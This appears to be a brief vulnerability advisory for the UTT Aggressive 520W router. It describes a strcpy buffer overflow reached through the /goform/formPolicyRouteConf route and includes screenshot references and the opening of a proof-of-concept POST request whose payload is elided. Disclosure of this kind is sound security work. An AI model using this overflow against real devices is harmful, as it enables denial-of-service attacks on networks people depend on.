...
The UTT Aggressive 520W router has a critical overflow vulnerability. An attacker can control the parameters by accessing the route /goform/formPolicyRouteConf, which can cause a buffer overflow. Specifically, this can be done by "strcpy((char *)(InstPointByIndex + 60), src);"Implement a denial-of-service attack.

# Vulnerability details

The API for invoking the function

![image-20260109213627047](39/image-20260109213627047.png)

You can see that some values are taken here

![image-20260109213817517](39/image-20260109213817517.png)

Here the replication via strpy results in an overflow

![image-20260109214038944](39/image-20260109214038944.png)



```
POST /goform/formPolicyRouteConf HTTP/1.1
Host: 192.168.1.1
Content-Length: 1822
...
![image-20251118224225970](39/image-20251118224225970.png)